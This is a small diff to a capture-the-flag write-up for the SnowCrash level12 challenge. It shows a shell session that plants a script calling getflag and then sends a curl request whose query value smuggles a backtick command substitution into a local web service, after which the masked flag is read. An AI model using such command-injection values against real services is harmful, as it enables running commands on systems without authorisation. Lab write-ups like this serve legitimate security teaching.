@@ -106,6 +106,8 @@ level12@SnowCrash:~$ cat /tmp/GETFLAG
 getflag > /tmp/flag
 level12@SnowCrash:~$ touch /tmp/flag
 level12@SnowCrash:~$ chmod 777 /tmp/GETFLAG
-level12@SnowCrash:~$ curl localhost:4646?x='`/*/GETFLAG`' 
+level12@SnowCrash:~$ curl localhost:4646?x='`/*/GETFLAG`'
+..level12@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 Gives us the flag.
